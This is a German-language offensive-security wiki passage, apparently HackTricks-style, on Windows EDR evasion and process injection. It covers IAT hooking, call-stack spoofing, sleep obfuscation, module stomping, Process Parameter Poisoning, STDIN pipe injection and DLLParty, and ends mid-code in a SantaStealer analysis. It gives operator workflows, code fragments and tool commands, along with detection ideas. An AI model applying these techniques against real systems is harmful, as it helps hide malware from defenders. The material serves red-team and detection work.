## API/IAT Hooking + Call-Stack Spoofing mit PIC (im Stil von Crystal Kit)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Ansatz auf hoher Ebene
- Ein PIC-Blob wird mithilfe eines Reflective Loaders neben dem Zielmodul bereitgestellt (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL werden deren IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge gezielter Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so angepasst, dass sie auf schlanke PIC-Wrapper verweisen.
- Jeder PIC-Wrapper führt vor dem Aufruf Evasion-Maßnahmen aus und ruft anschließend per Tail Call die echte API-Adresse auf. Typische Maßnahmen sind:
  - Speicher maskieren/demaskieren, um den Aufruf herum (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und nach dem Aufruf wiederherstellen.
  - Call-Stack-Spoofing: einen harmlosen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
- Zur Kompatibilität wird eine Schnittstelle exportiert, über die ein Aggressor-Skript (oder eine vergleichbare Komponente) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking?
- Funktioniert mit jedem Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder darauf angewiesen zu sein, dass Beacon bestimmte APIs als Proxy verwendet.
- Deckt Post-Ex-DLLs ab: Durch das Hooking von LoadLibrary* lassen sich Modul-Ladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Maskierungs- und Stack-Evasion-Maßnahmen auf deren API-Aufrufe anwenden.
- Ermöglicht wieder die zuverlässige Verwendung von Post-Ex-Befehlen, die Prozesse starten, gegen call-stack-basierte Erkennungen, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen das Hooking während der DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und vermeide Seiten, die gleichzeitig beschreibbar und ausführbar sind.

Call-stack spoofing stub
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Call Chain (Return Addresses in legitimen Modulen) und springen dann zur echten API.
- Damit lassen sich Erkennungen umgehen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere das mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwartete Frames zu gelangen.

Operative Integration
- Stelle den Reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Registriere Ziel-APIs mit einem Aggressor-Script, damit Beacon und BOFs ohne Codeänderungen transparent denselben Evasion-Pfad nutzen.

Überlegungen zu Detection/DFIR
- IAT-Integrität: Einträge, die auf Adressen außerhalb von Images (Heap/anon) aufgelöst werden; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Return Addresses, die nicht zu geladenen Images gehören; abrupte Übergänge zu nicht imagebasiertem PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: Schreibvorgänge im Prozess auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Umgehung der Image-Load-Erkennung: Wenn LoadLibrary* gehookt wird, verdächtige Ladevorgänge von Automatisierungs-/CLR-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Importzeitliches IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### IAT Hooks zur Importzeit über ein residenten PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Zeiger des Loaders durch einen eigenen Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem das kurzlebige Loader-PIC sich selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Imports per Ordinal und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Falls ein Hook existiert, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere Hook-Ziele beim Linken mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich im residenten PICO befindet.

Dadurch erfolgt eine **IAT-Umleitung zur Importzeit**, ohne den Code-Abschnitt der geladenen DLL nach dem Laden zu patchen.

### Hookbare Imports erzwingen, wenn das Ziel PEB-Walking verwendet

Hooks zur Importzeit werden nur ausgelöst, wenn die Funktion tatsächlich in der IAT des Ziels steht. Wenn ein Modul APIs per PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn verarbeitet:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch der Reflective Loader den Import beim Auflösen abfangen kann.

### Ekko-artige Sleep-/Idle-Obfuscation ohne `Sleep()`-Patching

Statt `Sleep` zu patchen, hooke die **tatsächlich verwendeten Wait-/IPC-Primitiven** des Implantats (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kannst du den Aufruf in eine Ekko-artige Obfuscation Chain einbetten, die das Abbild im Arbeitsspeicher während der Leerlaufphase verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Callback-Sequenz zu planen, die `NtContinue` mit vorbereiteten `CONTEXT`-Frames aufruft.
- Typische Chain (x64): Abbild auf `PAGE_READWRITE` setzen → per RC4 mit `advapi32!SystemFunction032` das gesamte gemappte Abbild verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **abschnittsweise Berechtigungen wiederherstellen**, indem die PE-Abschnitte durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für `CONTEXT`; klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Abbild maskiert ist. Dieses Muster verbirgt das Modul während Leerlaufphasen vor Scannern und vermeidet die klassische Signatur von „gepatchtem `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Schübe von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` verweisen.
- `advapi32!SystemFunction032`, das auf großen, zusammenhängenden, abbildgroßen Puffern verwendet wird.
- Großflächige `VirtualProtect`-Aufrufe, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Abschnitt.

### Laufzeitregistrierung von CFG-Zielen für Sleep-Obfuscation-Gadgets

Auf CFG-aktivierten Zielen führt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` üblicherweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Chains auch in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes indirekte Ziel der Chain mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** abdecken.
- Verwende bei manuell gemappten/PIC-/gestompten Regionen stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt aufgerufene Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) und alle ausführbaren, vom Angreifer kontrollierten Abschnitte, die zu indirekten Zielen werden.

Dadurch werden Sleep Chains im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einer wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere Endpunkte, die mit `/guard:cf` kompiliert wurden.

### CET-sicheres Stack Spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen scheitern, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies über `NtQueryInformationThread` dessen `NT_TIB`-/TEB-Stackgrenzen (`StackBase`, `StackLimit`) aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse mit `GetThreadContext` den echten Kontext des schlafenden Threads.
- Kopiere **nur** das echte `Rip` in den gefälschten Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Zeitfensters den `NT_TIB` des gefälschten Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach dem Wait den ursprünglichen TIB und den Thread-Kontext wieder her.

So bleibt der Instruction Pointer CET-konform, während EDR-Stack-Walker getäuscht werden, die TEB-Stack-Metadaten zur Validierung des Unwindings verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu auffällig ist, lässt sich dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz über einen angehaltenen Hilfsthread mit eingereihten APCs ausführen:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Einstiegspunkt.
- Reihe vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und führe sie mit `NtAlertResumeThread` aus.
- Speichere den Chain-Zustand auf dem Heap statt auf dem Stack des Hilfsthreads, um ein Erschöpfen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um atomar das Start-Event zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du den TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellen → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur aus `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibvorgänge in die TEB/TIB-Stackgrenzen des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung der Abschnittsberechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots in signierten Modulen.


## Präzises Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits im Zielprozess gemappt ist**, statt offensichtlichen privaten ausführbaren Speicher zu allozieren oder eine neue sacrificial DLL zu laden. Das Überschreibungsziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gängiger Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf:

1. Ermittle die Module des Zielprozesses und behalte eine **Namensliste** bereits geladener DLLs bei.
2. Erstelle zuerst die Payload und erfasse ihre **exakte Bytegröße**.
3. Durchsuche DLLs auf der Festplatte und vergleiche die PE-Abschnittsgröße **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da sie die Größe des ausführbaren Abschnitts **nach dem Mapping in den Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine RVA einer exportierten Funktion als Startoffset für das Stomping.
5. Berechne den **Blast Radius**: Überschreitet die Payload die Grenze der ausgewählten Funktion, überschreibt sie nachfolgende, im Speicher angeordnete Exports.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Loads zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden. Andernfalls können normale Codepfade die gestompften Bytes vor oder nach der Thread-Erstellung ausführen.
- Bei großen Implants muss die Einbettung des Shellcodes oft von einem String-Literal auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Detection ideas
- Remote-Schreibvorgänge in **ausführbare, Image-Backed-Pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige `VirtualProtect(Ex)`-/`WriteProcessMemory`-Sequenzen für DLL-`.text`-Pages, auf die eine Thread-Erstellung folgt.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion**-Technik, die den klassischen Remote-Write-Pfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte `CreateProcessW`-Startparameter in den Child-Prozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) ablegt.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierbare Carrier

Nützliche Carrier sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Carrier:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich Nullterminator begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` endet.
- `lpReserved` ist offiziell reserviert. Daher sollte das `ShellInfo`-Mapping als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

So wird die normale Prozesserstellung zur **Payload-Transfer-Primitive**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Lookup-Ablauf ohne Remote-Write-APIs

Nach der Erstellung des Child-Prozesses wird der kopierte Buffer mit **schreibgeschützten** Primitives aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, also nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Abläufen sind dafür **weder** `SuspendThread` **noch** `ResumeThread` erforderlich; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Damit werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Null-Bytes und gestaffelter Shellcode

Alle drei Träger sind **Zeichenketten oder zeichenkettenähnliche Daten**, daher wird eine rohe Payload mit `0x00` bei der Übertragung abgeschnitten. Ein praktischer Workaround ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Erzeugung von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Damit kann die erste Stufe Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Zielprozesses pushen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder relativ zu `RSP` adressierte Pointer setzen
- `RSP` vor dem Aufruf **an einer 16-Byte-Grenze ausrichten**

Anschließend kann eine zweite Stufe vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` in `PAGE_EXECUTE_READ` geändert und angesprungen werden. So wird eine direkte RWX-Allokation vermieden.

### Erkennungsmöglichkeiten

Die Autoren nennen folgende vielversprechende Ansatzpunkte für die Suche:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **Prozessparameter-Seiten ausführbar machen**
- auf diese Schutzänderung folgendes `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder hochentropische Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Transfer-Trick**, für sich genommen aber keine vollständige Ausführungsprimitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Umleitung der Ausführung.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, weil intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` zum Einsatz kommen.

Informationen zur Payload-Übertragung in einen **bereits bestehenden** Windows-Prozess über Thread-Beschreibungen mit anschließender Hijacking-Umleitung der Rücksprungadresse eines wartenden Threads finden Sie unter [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console-STDIN-Pipe-Injection

Ein interaktiver Konsolen-Child-Prozess kann ebenfalls als **Payload-Transfer-Primitive** dienen. Der Injector leitet die Standardeingabe des Child-Prozesses in eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, sucht der Injector diesen Buffer, macht ihn ausführbar und leitet einen Thread des Child-Prozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden; es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten. Der PoC wählt jedoch weder einen Pfad vom Typ `\\.\pipe\<name>` aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem standardmäßigen Sicherheitsdeskriptor, setzt das Lese-Handle in `STARTUPINFO.hStdInput`, aktiviert `STARTF_USESTDHANDLES` und startet einen neuen Child-Prozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenzablauf

Die Implementierung verwendet die folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Child-Prozesses erstellen. Die Vererbung für die beiden Handles auf Elternseite deaktivieren und nach der Prozesserstellung im Elternprozess die Duplikate auf Child-Seite schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Child-Prozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf Elternseite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, committed Speicherbereiche.
4. Den Adressraum des Child-Prozesses mit `VirtualQueryEx` durchlaufen, geeignete `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und nach dem Marker am Anfang von `rawData` suchen.
5. Den gefundenen Buffer mit `VirtualProtectEx` in `PAGE_EXECUTE_READWRITE` ändern.
6. Den Haupt-Thread ermitteln, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und den Thread fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und ihr eingebetteter Payload ist x64-Shellcode. `rawData` beginnt mit einem 25-Byte-Marker, daher beginnen die ausführbaren Bytes am hexadezimalen Offset `0x19`. Wenn du den Payload ersetzt, behalte dieses Layout bei oder aktualisiere Marker, Suchvektor, Arraygröße und Ausführungsoffset gemeinsam. In den Quellcodekommentaren sind außerdem `0x0A`, `0x0D` und `0x1A` als ungültige Zeichen aufgeführt. Dieser Workflow ändert weder das Token noch die Berechtigungen des Child-Prozesses.<sup>[[41]](#references)</sup>

Kleine native Hilfsprogramme und Muster zur Payload-Kompilierung findest du unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty passt Thread-Pool-Injection im PoolParty-Stil so an, dass ein vorhandener Worker des Ziels `LoadLibraryA` aufruft, statt einen injizierten Callback-Stub auszuführen. Als Dispatch-Primitive dient ein `TP_DIRECT`-Abschluss, der an den I/O-Abschlussport des Ziel-Pools gesendet wird. Dadurch werden Prozessberechtigungen nicht umgangen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt lesbaren und beschreibbaren Speicher im Ziel sowie duplizierbare Worker-Factory- und Abschlussport-Handles.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker einen Zeiger auf eine stackbasierte `TP_CALLBACK_INSTANCE` in `RCX`, dem ersten Callback-Argument. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Im getesteten Ablauf erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während sein erster gewöhnlicher Schreibzugriff auf dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in diesen 0x58-Byte-Präfix passt, kann daher am Anfang der Instanz abgelegt werden, ohne vor dem Dispatch überschrieben zu werden. Dies ist eine buildspezifische Beobachtung und keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenz-Workflow lautet:<sup>[[46]](#references)[[47]](#references)</sup>

1. Ermittle die Handles des Ziels mit `NtQuerySystemInformation(SystemHandleInformation)` und identifiziere `TpWorkerFactory`, indem du die Objekttypen abfragst. Dupliziere ein Worker-Factory-Handle und frage `WorkerFactoryBasicInformation` ab; `StartParameter` enthält den Remote-`TP_POOL`. Überspringe Factories mit `TotalWorkerCount == 0`.
2. Lies `TP_POOL.CompletionPort` aus und durchlaufe die private Worker-Liste des Pools. Im getesteten Windows-10-19045-x64-Build (`ntdll.dll 10.0.19041.4842`) befindet sich der Listenkopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, sodass der Callback-Instance-Slot bei `worker+0x38` gleich `link+0x28` ist. Der PoC prüft Zeigerausrichtung, Link-Reziprozität, Pool-Zugehörigkeit, Thread-IDs ungleich null, wiederholte Knoten und einen stabilen Listenkopf.
3. Schreibe den DLL-Pfad in **jeden** gefundenen Worker-Slot, da der Abschluss von jedem Worker verarbeitet werden kann. Platziere ein `TP_DIRECT` mit `Callback = LoadLibraryA` in beschreibbaren Speicher des Ziels. Der PoC verwendet `last_slot-0x500` auf einem Worker-Stack statt `VirtualAllocEx`; dieser Offset ist experimentell und darf nicht mit aktiven Stack-Daten kollidieren.
4. Dupliziere das Handle des Ziel-Abschlussports und rufe `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` auf. Die Adresse des Remote-`TP_DIRECT` ist der Completion Key. Ein vorhandener Worker ruft dann `LoadLibraryA` mit seinem überschriebenen Callback-Instance-Zeiger auf und lädt eine DLL, auf die das Ziel bereits zugreifen kann.

Der PoC akzeptiert eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; lege vor dem Erstellen einer x64-Executable einen Pfad fest, auf den das Ziel zugreifen kann. Außerdem verwendet er die `LoadLibraryA`-Adresse des eigenen Prozesses als Remote-Callback und setzt daher voraus, dass diese Adresse im Ziel gültig ist. Der Code prüft weder die Pfadlänge im Verhältnis zum 0x58-Byte-Präfix noch, ob die Worker-Durchsuchung vor dem Zugriff auf das letzte Element einen Slot gefunden hat. Überprüfe die privaten Offsets, das Stack-Layout und den beschreibbaren Speicher für den jeweiligen Ziel-Build erneut. Dass `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` entfallen, beseitigt weder Schreibzugriffe zwischen Prozessen noch die Telemetrie zum Laden von DLLs.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer: Vorgehensweisen zur fileless Umgehung und zum Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Bypass, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Prüfung des Tastaturlayouts und Sandbox-Verzögerung

- Ein Konfigurationsflag (`anti_cis`) ermittelt mit `GetKeyboardLayoutList` die installierten Tastaturlayouts. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor es Stealer ausführt. So wird verhindert, dass es in ausgeschlossenen Regionen aktiv wird, während gleichzeitig ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
